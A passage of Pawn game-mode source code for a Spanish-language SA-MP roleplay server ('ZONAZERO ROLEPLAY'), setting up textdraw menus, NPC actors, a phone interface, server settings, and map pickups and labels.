	}

	for(new i=0; i<sizeof visualizador; i++)
	{
		visualizador[i][tdrawID][0] = TextDrawCreate(436.000000, 386.000000, ">>>");
		TextDrawAlignment(visualizador[i][tdrawID], 2);
		TextDrawBackgroundColor(visualizador[i][tdrawID], 255);
		TextDrawFont(visualizador[i][tdrawID][0], 1);
		TextDrawLetterSize(visualizador[i][tdrawID][0], 0.479999, 2.899998);
		TextDrawColor(visualizador[i][tdrawID][0], -1);
		TextDrawSetOutline(visualizador[i][tdrawID][0], 0);
		TextDrawSetProportional(visualizador[i][tdrawID][0], 1);
		TextDrawSetShadow(visualizador[i][tdrawID][0], 1);
		TextDrawUseBox(visualizador[i][tdrawID][0], 1);
		TextDrawBoxColor(visualizador[i][tdrawID][0], 255);
		TextDrawTextSize(visualizador[i][tdrawID][0], 30.000000, 30.000000);
		TextDrawSetSelectable(visualizador[i][tdrawID][0], true);

		visualizador[i][tdrawID][1] = TextDrawCreate(190.000000, 386.000000, "<<<");
		TextDrawAlignment(visualizador[i][tdrawID][1], 2);
		TextDrawBackgroundColor(visualizador[i][tdrawID][1], 255);
		TextDrawFont(visualizador[i][tdrawID][1], 1);
		TextDrawLetterSize(visualizador[i][tdrawID][1], 0.479999, 2.899998);
		TextDrawColor(visualizador[i][tdrawID][1], -1);
		TextDrawSetOutline(visualizador[i][tdrawID][1], 0);
		TextDrawSetProportional(visualizador[i][tdrawID][1], 1);
		TextDrawSetShadow(visualizador[i][tdrawID][1], 1);
		TextDrawUseBox(visualizador[i][tdrawID][1], 1);
		TextDrawBoxColor(visualizador[i][tdrawID][1], 255);
		TextDrawTextSize(visualizador[i][tdrawID][1], 30.000000, 30.000000);
		TextDrawSetSelectable(visualizador[i][tdrawID][1], true);

		visualizador[i][tdrawID][2] = TextDrawCreate(331.000000, 419.000000, "_");
		TextDrawAlignment(visualizador[i][tdrawID][2], 2);
		TextDrawBackgroundColor(visualizador[i][tdrawID][2], 255);
		TextDrawFont(visualizador[i][tdrawID][2], 2);
		TextDrawLetterSize(visualizador[i][tdrawID][2], 0.479999, 2.899998);
		TextDrawColor(visualizador[i][tdrawID][2], -1);
		TextDrawSetOutline(visualizador[i][tdrawID][2], 0);
		TextDrawSetProportional(visualizador[i][tdrawID][2], 1);
		TextDrawSetShadow(visualizador[i][tdrawID][2], 1);
		TextDrawUseBox(visualizador[i][tdrawID][2], 1);
		TextDrawBoxColor(visualizador[i][tdrawID][2], 255);
		TextDrawTextSize(visualizador[i][tdrawID][2], 30.000000, 680.000000);
		TextDrawSetSelectable(visualizador[i][tdrawID][2], 0);

		visualizador[i][tdrawID][3] = TextDrawCreate(261.000000, 386.000000, "COMPRAR");
		TextDrawAlignment(visualizador[i][tdrawID][3], 2);
		TextDrawBackgroundColor(visualizador[i][tdrawID][3], 255);
		TextDrawFont(visualizador[i][tdrawID][3], 2);
		TextDrawLetterSize(visualizador[i][tdrawID][3], 0.479999, 2.899998);
		TextDrawColor(visualizador[i][tdrawID][3], -1);
		TextDrawSetOutline(visualizador[i][tdrawID][3], 0);
		TextDrawSetProportional(visualizador[i][tdrawID][3], 1);
		TextDrawSetShadow(visualizador[i][tdrawID][3], 1);
		TextDrawUseBox(visualizador[i][tdrawID][3], 1);
		TextDrawBoxColor(visualizador[i][tdrawID][3], 255);
		TextDrawTextSize(visualizador[i][tdrawID][3], 30.000000, 96.000000);
		TextDrawSetSelectable(visualizador[i][tdrawID][3], true);

		visualizador[i][tdrawID][4] = TextDrawCreate(365.000000, 386.000000, "SALIR");
		TextDrawAlignment(visualizador[i][tdrawID][4], 2);
		TextDrawBackgroundColor(visualizador[i][tdrawID][4], 255);
		TextDrawFont(visualizador[i][tdrawID][4], 2);
		TextDrawLetterSize(visualizador[i][tdrawID][4], 0.479999, 2.899998);
		TextDrawColor(visualizador[i][tdrawID][4], -1);
		TextDrawSetOutline(visualizador[i][tdrawID][4], 0);
		TextDrawSetProportional(visualizador[i][tdrawID][4], 1);
		TextDrawSetShadow(visualizador[i][tdrawID][4], 1);
		TextDrawUseBox(visualizador[i][tdrawID][4], 1);
		TextDrawBoxColor(visualizador[i][tdrawID][4], 255);
		TextDrawTextSize(visualizador[i][tdrawID][4], 30.000000, 96.000000);
		TextDrawSetSelectable(visualizador[i][tdrawID][4], true);
	}
	
	for(new i=0;i<sizeof(nonplayers);i++)
	{
		nonplayers[i][npcID] = CreateActor(nonplayers[i][npcModel], nonplayers[i][npcPos][0], nonplayers[i][npcPos][1], nonplayers[i][npcPos][2], nonplayers[i][npcPos][3]);
		SetActorVirtualWorld(nonplayers[i][npcID], nonplayers[i][npcWorld]);
		
		new string[64];
		format(string, sizeof(string), "Presione click derecho \nPara interactuar con %s.", nonplayers[i][npcNombre]);
		CreateDynamic3DTextLabel(string, 0xFFFFFF88, nonplayers[i][npcPos][0], nonplayers[i][npcPos][1], nonplayers[i][npcPos][2]+0.95, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, nonplayers[i][npcWorld], -1, -1);

		nonplayers[i][interfaz][0] = TextDrawCreate(320.000000, 176.000000, "_________~n~_________~n~_________~n~_________~n~_________~n~_________~n~_________~n~_________~n~_________~n~_________~n~________");
		TextDrawAlignment(nonplayers[i][interfaz][0], 2);
		TextDrawBackgroundColor(nonplayers[i][interfaz][0], 255);
		TextDrawFont(nonplayers[i][interfaz][0], 2);
		TextDrawLetterSize(nonplayers[i][interfaz][0], 0.260000, 0.899999);
		TextDrawColor(nonplayers[i][interfaz][0], -1);
		TextDrawSetOutline(nonplayers[i][interfaz][0], 0);
		TextDrawSetProportional(nonplayers[i][interfaz][0], 1);
		TextDrawSetShadow(nonplayers[i][interfaz][0], 1);
		TextDrawUseBox(nonplayers[i][interfaz][0], 1);
		TextDrawBoxColor(nonplayers[i][interfaz][0], 85);
		TextDrawTextSize(nonplayers[i][interfaz][0], 0.000000, 137.000000);
		TextDrawSetSelectable(nonplayers[i][interfaz][0], 0);
		
		nonplayers[i][interfaz][1] = TextDrawCreate(320.000000, 180.000000, nonplayers[i][npcText1]);
		TextDrawAlignment(nonplayers[i][interfaz][1], 2);
		TextDrawBackgroundColor(nonplayers[i][interfaz][1], 255);
		TextDrawFont(nonplayers[i][interfaz][1], 2);
		TextDrawLetterSize(nonplayers[i][interfaz][1], 0.260000, 1.000000);
		TextDrawColor(nonplayers[i][interfaz][1], -1);
		TextDrawSetOutline(nonplayers[i][interfaz][1], 0);
		TextDrawSetProportional(nonplayers[i][interfaz][1], 1);
		TextDrawSetShadow(nonplayers[i][interfaz][1], 1);
		TextDrawUseBox(nonplayers[i][interfaz][1], 1);
		TextDrawBoxColor(nonplayers[i][interfaz][1], 255);
		TextDrawTextSize(nonplayers[i][interfaz][1], 20.000000, 130.000000);
		TextDrawSetSelectable(nonplayers[i][interfaz][1], true);
		
		nonplayers[i][interfaz][2] = TextDrawCreate(320.000000, 198.000000, nonplayers[i][npcText2]);
		TextDrawAlignment(nonplayers[i][interfaz][2], 2);
		TextDrawBackgroundColor(nonplayers[i][interfaz][2], 255);
		TextDrawFont(nonplayers[i][interfaz][2], 2);
		TextDrawLetterSize(nonplayers[i][interfaz][2], 0.260000, 1.000000);
		TextDrawColor(nonplayers[i][interfaz][2], -1);
		TextDrawSetOutline(nonplayers[i][interfaz][2], 0);
		TextDrawSetProportional(nonplayers[i][interfaz][2], 1);
		TextDrawSetShadow(nonplayers[i][interfaz][2], 1);
		TextDrawUseBox(nonplayers[i][interfaz][2], 1);
		TextDrawBoxColor(nonplayers[i][interfaz][2], 255);
		TextDrawTextSize(nonplayers[i][interfaz][2], 20.000000, 130.000000);
		TextDrawSetSelectable(nonplayers[i][interfaz][2], true);

		nonplayers[i][interfaz][3] = TextDrawCreate(320.000000, 216.000000, nonplayers[i][npcText3]);
		TextDrawAlignment(nonplayers[i][interfaz][3], 2);
		TextDrawBackgroundColor(nonplayers[i][interfaz][3], 255);
		TextDrawFont(nonplayers[i][interfaz][3], 2);
		TextDrawLetterSize(nonplayers[i][interfaz][3], 0.260000, 1.000000);
		TextDrawColor(nonplayers[i][interfaz][3], -1);
		TextDrawSetOutline(nonplayers[i][interfaz][3], 0);
		TextDrawSetProportional(nonplayers[i][interfaz][3], 1);
		TextDrawSetShadow(nonplayers[i][interfaz][3], 1);
		TextDrawUseBox(nonplayers[i][interfaz][3], 1);
		TextDrawBoxColor(nonplayers[i][interfaz][3], 255);
		TextDrawTextSize(nonplayers[i][interfaz][3], 20.000000, 130.000000);
		TextDrawSetSelectable(nonplayers[i][interfaz][3], true);

		nonplayers[i][interfaz][4] = TextDrawCreate(320.000000, 235.000000, nonplayers[i][npcText4]);
		TextDrawAlignment(nonplayers[i][interfaz][4], 2);
		TextDrawBackgroundColor(nonplayers[i][interfaz][4], 255);
		TextDrawFont(nonplayers[i][interfaz][4], 2);
		TextDrawLetterSize(nonplayers[i][interfaz][4], 0.260000, 1.000000);
		TextDrawColor(nonplayers[i][interfaz][4], -1);
		TextDrawSetOutline(nonplayers[i][interfaz][4], 0);
		TextDrawSetProportional(nonplayers[i][interfaz][4], 1);
		TextDrawSetShadow(nonplayers[i][interfaz][4], 1);
		TextDrawUseBox(nonplayers[i][interfaz][4], 1);
		TextDrawBoxColor(nonplayers[i][interfaz][4], 255);
		TextDrawTextSize(nonplayers[i][interfaz][4], 20.000000, 130.000000);
		TextDrawSetSelectable(nonplayers[i][interfaz][4], true);

		nonplayers[i][interfaz][5] = TextDrawCreate(320.000000, 253.000000, "no deseo nada");
		TextDrawAlignment(nonplayers[i][interfaz][5], 2);
		TextDrawBackgroundColor(nonplayers[i][interfaz][5], 255);
		TextDrawFont(nonplayers[i][interfaz][5], 2);
		TextDrawLetterSize(nonplayers[i][interfaz][5], 0.260000, 1.000000);
		TextDrawColor(nonplayers[i][interfaz][5], -1);
		TextDrawSetOutline(nonplayers[i][interfaz][5], 0);
		TextDrawSetProportional(nonplayers[i][interfaz][5], 1);
		TextDrawSetShadow(nonplayers[i][interfaz][5], 1);
		TextDrawUseBox(nonplayers[i][interfaz][5], 1);
		TextDrawBoxColor(nonplayers[i][interfaz][5], 255);
		TextDrawTextSize(nonplayers[i][interfaz][5], 20.000000, 130.000000);
		TextDrawSetSelectable(nonplayers[i][interfaz][5], true);
	}
	
	TextdrawGlobal[0] = TextDrawCreate(510.000000, 329.000000, "~n~_~n~_~n~_~n~_~n~_~n~");
	TextDrawBackgroundColor(TextdrawGlobal[0], 255);
	TextDrawFont(TextdrawGlobal[0], 2);
	TextDrawLetterSize(TextdrawGlobal[0], 0.279999, 1.600000);
	TextDrawColor(TextdrawGlobal[0], -1);
	TextDrawSetOutline(TextdrawGlobal[0], 1);
	TextDrawSetProportional(TextdrawGlobal[0], 1);
	TextDrawUseBox(TextdrawGlobal[0], 1);
	TextDrawBoxColor(TextdrawGlobal[0], 85);
	TextDrawTextSize(TextdrawGlobal[0], 633.000000, 150.000000);
	TextDrawSetSelectable(TextdrawGlobal[0], 0);
	
	TextdrawGlobal[1] = TextDrawCreate(100.000000, 60.000000, "[~r~Bajada~w~] AmmuNation - Cesar_Segura - Los Santos - ~g~750$~w~ - 20~n~ ");
	TextDrawBackgroundColor(TextdrawGlobal[1], 255);
	TextDrawFont(TextdrawGlobal[1], 1);
	TextDrawLetterSize(TextdrawGlobal[1], 0.259999, 1.600000);
	TextDrawColor(TextdrawGlobal[1], -1);
	TextDrawSetOutline(TextdrawGlobal[1], 0);
	TextDrawSetProportional(TextdrawGlobal[1], 1);
	TextDrawSetShadow(TextdrawGlobal[1], 1);
	TextDrawUseBox(TextdrawGlobal[1], 1);
	TextDrawBoxColor(TextdrawGlobal[1], 255);
	TextDrawTextSize(TextdrawGlobal[1], 487.000000, 0.000000);
	TextDrawSetSelectable(TextdrawGlobal[1], 0);

	iPhoneGlobalTextdraw[0] = TextDrawCreate(478.000000, 140.000000, "_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~");
	TextDrawAlignment(iPhoneGlobalTextdraw[0], 2);
	TextDrawBackgroundColor(iPhoneGlobalTextdraw[0], 255);
	TextDrawFont(iPhoneGlobalTextdraw[0], 1);
	TextDrawLetterSize(iPhoneGlobalTextdraw[0], 0.499900, 1.009999);
	TextDrawColor(iPhoneGlobalTextdraw[0], -1);
	TextDrawSetOutline(iPhoneGlobalTextdraw[0], 0);
	TextDrawSetProportional(iPhoneGlobalTextdraw[0], 1);
	TextDrawSetShadow(iPhoneGlobalTextdraw[0], 1);
	TextDrawUseBox(iPhoneGlobalTextdraw[0], 1);
	TextDrawBoxColor(iPhoneGlobalTextdraw[0], 255);
	TextDrawTextSize(iPhoneGlobalTextdraw[0], 0.000000, 116.000000);
	TextDrawSetSelectable(iPhoneGlobalTextdraw[0], 0);

	iPhoneGlobalTextdraw[1] = TextDrawCreate(478.000000, 133.000000, "_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~");
	TextDrawAlignment(iPhoneGlobalTextdraw[1], 2);
	TextDrawBackgroundColor(iPhoneGlobalTextdraw[1], 255);
	TextDrawFont(iPhoneGlobalTextdraw[1], 1);
	TextDrawLetterSize(iPhoneGlobalTextdraw[1], 0.499900, 1.099998);
	TextDrawColor(iPhoneGlobalTextdraw[1], -1);
	TextDrawSetOutline(iPhoneGlobalTextdraw[1], 0);
	TextDrawSetProportional(iPhoneGlobalTextdraw[1], 1);
	TextDrawSetShadow(iPhoneGlobalTextdraw[1], 1);
	TextDrawUseBox(iPhoneGlobalTextdraw[1], 1);
	TextDrawBoxColor(iPhoneGlobalTextdraw[1], 255);
	TextDrawTextSize(iPhoneGlobalTextdraw[1], 0.000000, 99.000000);
	TextDrawSetSelectable(iPhoneGlobalTextdraw[1], 0);

	iPhoneGlobalTextdraw[2] = TextDrawCreate(417.000000, 130.000000, "ld_pool:ball");
	TextDrawBackgroundColor(iPhoneGlobalTextdraw[2], 255);
	TextDrawFont(iPhoneGlobalTextdraw[2], 4);
	TextDrawLetterSize(iPhoneGlobalTextdraw[2], 1.000000, 1.000000);
	TextDrawColor(iPhoneGlobalTextdraw[2], 255);
	TextDrawSetOutline(iPhoneGlobalTextdraw[2], 0);
	TextDrawSetProportional(iPhoneGlobalTextdraw[2], 1);
	TextDrawSetShadow(iPhoneGlobalTextdraw[2], 1);
	TextDrawUseBox(iPhoneGlobalTextdraw[2], 1);
	TextDrawBoxColor(iPhoneGlobalTextdraw[2], 255);
	TextDrawTextSize(iPhoneGlobalTextdraw[2], 22.000000, 23.000000);
	TextDrawSetSelectable(iPhoneGlobalTextdraw[2], 0);

	iPhoneGlobalTextdraw[3] = TextDrawCreate(517.000000, 130.000000, "ld_pool:ball");
	TextDrawBackgroundColor(iPhoneGlobalTextdraw[3], 255);
	TextDrawFont(iPhoneGlobalTextdraw[3], 4);
	TextDrawLetterSize(iPhoneGlobalTextdraw[3], 1.000000, 1.000000);
	TextDrawColor(iPhoneGlobalTextdraw[3], 255);
	TextDrawSetOutline(iPhoneGlobalTextdraw[3], 0);
	TextDrawSetProportional(iPhoneGlobalTextdraw[3], 1);
	TextDrawSetShadow(iPhoneGlobalTextdraw[3], 1);
	TextDrawUseBox(iPhoneGlobalTextdraw[3], 1);
	TextDrawBoxColor(iPhoneGlobalTextdraw[3], 255);
	TextDrawTextSize(iPhoneGlobalTextdraw[3], 22.000000, 23.000000);
	TextDrawSetSelectable(iPhoneGlobalTextdraw[3], 0);

	iPhoneGlobalTextdraw[4] = TextDrawCreate(517.000000, 312.000000, "ld_pool:ball");
	TextDrawBackgroundColor(iPhoneGlobalTextdraw[4], 255);
	TextDrawFont(iPhoneGlobalTextdraw[4], 4);
	TextDrawLetterSize(iPhoneGlobalTextdraw[4], 1.000000, 1.000000);
	TextDrawColor(iPhoneGlobalTextdraw[4], 255);
	TextDrawSetOutline(iPhoneGlobalTextdraw[4], 0);
	TextDrawSetProportional(iPhoneGlobalTextdraw[4], 1);
	TextDrawSetShadow(iPhoneGlobalTextdraw[4], 1);
	TextDrawUseBox(iPhoneGlobalTextdraw[4], 1);
	TextDrawBoxColor(iPhoneGlobalTextdraw[4], 255);
	TextDrawTextSize(iPhoneGlobalTextdraw[4], 22.000000, 23.000000);
	TextDrawSetSelectable(iPhoneGlobalTextdraw[4], 0);

	iPhoneGlobalTextdraw[5] = TextDrawCreate(417.000000, 312.000000, "ld_pool:ball");
	TextDrawBackgroundColor(iPhoneGlobalTextdraw[5], 255);
	TextDrawFont(iPhoneGlobalTextdraw[5], 4);
	TextDrawLetterSize(iPhoneGlobalTextdraw[5], 1.000000, 1.000000);
	TextDrawColor(iPhoneGlobalTextdraw[5], 255);
	TextDrawSetOutline(iPhoneGlobalTextdraw[5], 0);
	TextDrawSetProportional(iPhoneGlobalTextdraw[5], 1);
	TextDrawSetShadow(iPhoneGlobalTextdraw[5], 1);
	TextDrawUseBox(iPhoneGlobalTextdraw[5], 1);
	TextDrawBoxColor(iPhoneGlobalTextdraw[5], 255);
	TextDrawTextSize(iPhoneGlobalTextdraw[5], 22.000000, 23.000000);
	TextDrawSetSelectable(iPhoneGlobalTextdraw[5], 0);

	iPhoneGlobalTextdraw[6] = TextDrawCreate(478.000000, 140.000000, "_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~_~n~");
	TextDrawAlignment(iPhoneGlobalTextdraw[6], 2);
	TextDrawBackgroundColor(iPhoneGlobalTextdraw[6], 255);
	TextDrawFont(iPhoneGlobalTextdraw[6], 1);
	TextDrawLetterSize(iPhoneGlobalTextdraw[6], 0.499900, 0.920000);
	TextDrawColor(iPhoneGlobalTextdraw[6], -1);
	TextDrawSetOutline(iPhoneGlobalTextdraw[6], 0);
	TextDrawSetProportional(iPhoneGlobalTextdraw[6], 1);
	TextDrawSetShadow(iPhoneGlobalTextdraw[6], 1);
	TextDrawUseBox(iPhoneGlobalTextdraw[6], 1);
	TextDrawBoxColor(iPhoneGlobalTextdraw[6], -103);
	TextDrawTextSize(iPhoneGlobalTextdraw[6], 0.000000, 102.000000);
	TextDrawSetSelectable(iPhoneGlobalTextdraw[6], 0);

	iPhoneGlobalTextdraw[7] = TextDrawCreate(466.000000, 311.000000, "ld_pool:ball");
	TextDrawBackgroundColor(iPhoneGlobalTextdraw[7], 255);
	TextDrawFont(iPhoneGlobalTextdraw[7], 4);
	TextDrawLetterSize(iPhoneGlobalTextdraw[7], 0.994598, 0.889999);
	TextDrawColor(iPhoneGlobalTextdraw[7], -103);
	TextDrawSetOutline(iPhoneGlobalTextdraw[7], 0);
	TextDrawSetProportional(iPhoneGlobalTextdraw[7], 1);
	TextDrawSetShadow(iPhoneGlobalTextdraw[7], 1);
	TextDrawUseBox(iPhoneGlobalTextdraw[7], 1);
	TextDrawBoxColor(iPhoneGlobalTextdraw[7], -1061109641);
	TextDrawTextSize(iPhoneGlobalTextdraw[7], 20.000000, 20.000000);
	TextDrawSetSelectable(iPhoneGlobalTextdraw[7], 0);

	iPhoneGlobalTextdraw[8] = TextDrawCreate(467.000000, 312.000000, "ld_pool:ball");
	TextDrawBackgroundColor(iPhoneGlobalTextdraw[8], 255);
	TextDrawFont(iPhoneGlobalTextdraw[8], 4);
	TextDrawLetterSize(iPhoneGlobalTextdraw[8], 0.994598, 0.889999);
	TextDrawColor(iPhoneGlobalTextdraw[8], 255);
	TextDrawSetOutline(iPhoneGlobalTextdraw[8], 0);
	TextDrawSetProportional(iPhoneGlobalTextdraw[8], 1);
	TextDrawSetShadow(iPhoneGlobalTextdraw[8], 1);
	TextDrawUseBox(iPhoneGlobalTextdraw[8], 1);
	TextDrawBoxColor(iPhoneGlobalTextdraw[8], -1061109641);
	TextDrawTextSize(iPhoneGlobalTextdraw[8], 18.000000, 18.000000);
	TextDrawSetSelectable(iPhoneGlobalTextdraw[8], 0);
	
	iPhoneGlobalTextdraw[9] = TextDrawCreate(445.000000, 149.000000, "11:50 a.m.");
	TextDrawBackgroundColor(iPhoneGlobalTextdraw[9], 255);
	TextDrawFont(iPhoneGlobalTextdraw[9], 2);
	TextDrawLetterSize(iPhoneGlobalTextdraw[9], 0.379999, 1.200000);
	TextDrawColor(iPhoneGlobalTextdraw[9], -1);
	TextDrawSetOutline(iPhoneGlobalTextdraw[9], 0);
	TextDrawSetProportional(iPhoneGlobalTextdraw[9], 1);
	TextDrawSetShadow(iPhoneGlobalTextdraw[9], 1);
	TextDrawSetSelectable(iPhoneGlobalTextdraw[9], 0);

	iPhoneGlobalTextdraw[10] = TextDrawCreate(476.000000, 319.000000, "_~n~_~n~");
	TextDrawAlignment(iPhoneGlobalTextdraw[10], 2);
	TextDrawBackgroundColor(iPhoneGlobalTextdraw[10], 255);
	TextDrawFont(iPhoneGlobalTextdraw[10], 0);
	TextDrawLetterSize(iPhoneGlobalTextdraw[10], 0.994198, 0.230000);
	TextDrawColor(iPhoneGlobalTextdraw[10], 255);
	TextDrawSetOutline(iPhoneGlobalTextdraw[10], 0);
	TextDrawSetProportional(iPhoneGlobalTextdraw[10], 1);
	TextDrawSetShadow(iPhoneGlobalTextdraw[10], 1);
	TextDrawUseBox(iPhoneGlobalTextdraw[10], 1);
	TextDrawBoxColor(iPhoneGlobalTextdraw[10], -1061109641);
	TextDrawTextSize(iPhoneGlobalTextdraw[10], 20.000000, 4.000000);
	TextDrawSetSelectable(iPhoneGlobalTextdraw[10], 0);

	iPhoneGlobalTextdraw[11] = TextDrawCreate(476.000000, 320.000000, "_~n~_~n~");
	TextDrawAlignment(iPhoneGlobalTextdraw[11], 2);
	TextDrawBackgroundColor(iPhoneGlobalTextdraw[11], 255);
	TextDrawFont(iPhoneGlobalTextdraw[11], 0);
	TextDrawLetterSize(iPhoneGlobalTextdraw[11], 0.994198, 0.140000);
	TextDrawColor(iPhoneGlobalTextdraw[11], 255);
	TextDrawSetOutline(iPhoneGlobalTextdraw[11], 0);
	TextDrawSetProportional(iPhoneGlobalTextdraw[11], 1);
	TextDrawSetShadow(iPhoneGlobalTextdraw[11], 1);
	TextDrawUseBox(iPhoneGlobalTextdraw[11], 1);
	TextDrawBoxColor(iPhoneGlobalTextdraw[11], 255);
	TextDrawTextSize(iPhoneGlobalTextdraw[11], 20.000000, 2.000000);
	TextDrawSetSelectable(iPhoneGlobalTextdraw[11], 0);

	Presentacion[0] = TextDrawCreate(324.000000, 123.000000, "_~n~_~n~_~n~_~n~_~n~_~n~_~n~_");
	TextDrawAlignment(Presentacion[0], 2);
	TextDrawBackgroundColor(Presentacion[0], 255);
	TextDrawFont(Presentacion[0], 1);
	TextDrawLetterSize(Presentacion[0], 0.679998, 3.399998);
	TextDrawColor(Presentacion[0], -1);
	TextDrawSetOutline(Presentacion[0], 0);
	TextDrawSetProportional(Presentacion[0], 1);
	TextDrawSetShadow(Presentacion[0], 1);
	TextDrawUseBox(Presentacion[0], 1);
	TextDrawBoxColor(Presentacion[0], -8453430);
	TextDrawTextSize(Presentacion[0], 0.000000, 371.000000);
	TextDrawSetSelectable(Presentacion[0], 0);

	Presentacion[1] = TextDrawCreate(324.000000, 126.000000, "_~n~_~n~_~n~_~n~_~n~_~n~_~n~_");
	TextDrawAlignment(Presentacion[1], 2);
	TextDrawBackgroundColor(Presentacion[1], 255);
	TextDrawFont(Presentacion[1], 1);
	TextDrawLetterSize(Presentacion[1], 0.679998, 3.299998);
	TextDrawColor(Presentacion[1], -1);
	TextDrawSetOutline(Presentacion[1], 0);
	TextDrawSetProportional(Presentacion[1], 1);
	TextDrawSetShadow(Presentacion[1], 1);
	TextDrawUseBox(Presentacion[1], 1);
	TextDrawBoxColor(Presentacion[1], 255);
	TextDrawTextSize(Presentacion[1], 1.000000, 365.000000);
	TextDrawSetSelectable(Presentacion[1], 0);

	Presentacion[2] = TextDrawCreate(250.000000, 120.000000, "ZONAZERO ROLEPLAY");
	TextDrawBackgroundColor(Presentacion[2], 255);
	TextDrawFont(Presentacion[2], 2);
	TextDrawLetterSize(Presentacion[2], 0.300000, 2.000000);
	TextDrawColor(Presentacion[2], -1);
	TextDrawSetOutline(Presentacion[2], 1);
	TextDrawSetProportional(Presentacion[2], 1);
	TextDrawSetSelectable(Presentacion[2], 0);

	Presentacion[3] = TextDrawCreate(165.000000, 133.000000, "-");
	TextDrawBackgroundColor(Presentacion[3], 255);
	TextDrawFont(Presentacion[3], 2);
	TextDrawLetterSize(Presentacion[3], 25.000000, 1.000000);
	TextDrawColor(Presentacion[3], -8453430);
	TextDrawSetOutline(Presentacion[3], 1);
	TextDrawSetProportional(Presentacion[3], 1);
	TextDrawSetSelectable(Presentacion[3], 0);

	Presentacion[4] = TextDrawCreate(324.000000, 148.000000, "_~n~_~n~_~n~_~n~_~n~_~n~_~n~_");
	TextDrawAlignment(Presentacion[4], 2);
	TextDrawBackgroundColor(Presentacion[4], 255);
	TextDrawFont(Presentacion[4], 1);
	TextDrawLetterSize(Presentacion[4], 0.679998, 2.599999);
	TextDrawColor(Presentacion[4], -1);
	TextDrawSetOutline(Presentacion[4], 0);
	TextDrawSetProportional(Presentacion[4], 1);
	TextDrawSetShadow(Presentacion[4], 1);
	TextDrawUseBox(Presentacion[4], 1);
	TextDrawBoxColor(Presentacion[4], -1027423542);
	TextDrawTextSize(Presentacion[4], 1.000000, 357.000000);
	TextDrawSetSelectable(Presentacion[4], 0);

	streamer = TextDrawCreate(210.000000, 214.000000, "CARGANDO OBJETOS ESPERA POR FAVOR");
	TextDrawBackgroundColor(streamer, 255);
	TextDrawFont(streamer, 2);
	TextDrawLetterSize(streamer, 0.260000, 1.300000);
	TextDrawColor(streamer, -1);
	TextDrawSetOutline(streamer, 0);
	TextDrawSetProportional(streamer, 1);
	TextDrawSetShadow(streamer, 1);
	
    ManualVehicleEngineAndLights();
	UsePlayerPedAnims();

	SetGameModeText(ModeText);
	//SendRconCommand("password 0");
	SendRconCommand(MapName);
	SendRconCommand(Hostname);
	SendRconCommand("language Español - LS");
	KillTimer(BankTimer);
	gettime(ghour, gminute, gsecond);
	FixHour(ghour);
	ghour = shifthour;
	if(!realtime)
	{
		SetWorldTime(wtime);
	}
	AllowInteriorWeapons(1);
	DisableInteriorEnterExits();
	EnableStuntBonusForAll(0);
	OnGlobalPropTextdrawUpdate();
	OnGlobalBizzTextdrawUpdate();

	CreateDynamic3DTextLabel("Para llenar el tanque de tu vehiculo utilice\n{FC7F75}/llenar", 0xFFFFFFFF, -95.5910, -1170.5741, 2.4599, 5.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamic3DTextLabel("Para llenar el tanque de tu vehiculo utilice\n{FC7F75}/llenar", 0xFFFFFFFF, 995.7507, -937.9496, 42.3281, 5.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamic3DTextLabel("Para llenar el tanque de tu vehiculo utilice\n{FC7F75}/llenar", 0xFFFFFFFF, 1941.5747, -1779.8634, 13.3906, 5.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamicPickup(1239, 1, -95.5910, -1170.5741, 2.4599);
	CreateDynamicPickup(1239, 1, 995.7507, -937.9496, 42.3281);
	CreateDynamicPickup(1239, 1, 1941.5747, -1779.8634, 13.3906);
 
	//Carteles Publicitarios
	CreateDynamicPickup(1239, 1, 1088.1642, -1377.9141, 13.8070);
	CreateDynamic3DTextLabel("CNN -{868FD9} Centro de anuncios Carteles\n{FFFFFF}/publicidad", 0xFFFFFFFF, 1088.1642, -1377.9141, 13.8070, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	// 3D Labels
	CreateDynamic3DTextLabel("{ABD387}Estándares de ropa:{FFFFFF} Uniforme y cajas de herramientas para mecánicos!", -1, 2132.3005, -2280.6406, 14.7769, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	CreateDynamic3DTextLabel("{ABD387}Librero:{FFFFFF} Radios, manuales e identificaciones para mecánicos!", -1, 2124.6816, -2272.2881, 20.6719, 8.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);

	//Anuncio
	CreateDynamicPickup(1239, 1, 1088.3285, -1379.8683, 13.8077); // /ad
	
	#if defined NAVIDAD
	//Especial de NAVIDAD
	CreateDynamicPickup(19058, 1, 1480.0016, -1669.4573, 14.5532);
	CreateDynamic3DTextLabel("Regalo diario{868FD9} utilice\n{B22222}/regalo", 0xFFFFFFFF, 1480.0016, -1669.4573, 14.5532, 50.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, 0);
	#endif
	
	for(new i=0; i<sizeof(trabajos); i++)
	{
		CreateDynamicMapIcon(trabajos[i][trabPos][0], trabajos[i][trabPos][1], trabajos[i][trabPos][2], 56, 0, 0, MAPICON_LOCAL);
	}
	for(new i=0; i<sizeof(articulos); i++)
	{
		CreateDynamicMapIcon(articulos[i][artPos][0], articulos[i][artPos][1], articulos[i][artPos][2], 17, 0, articulos[i][artWolrd], articulos[i][artInt]);
	}
	for(new i=0; i<sizeof(fabricas); i++)
	{
		CreateDynamicPickup(1314, 1, fabricas[i][f@conq][0], fabricas[i][f@conq][1], fabricas[i][f@conq][2]);
		CreateDynamicPickup(1239, 1, fabricas[i][f@entradasal][0], fabricas[i][f@entradasal][1], fabricas[i][f@entradasal][2]);
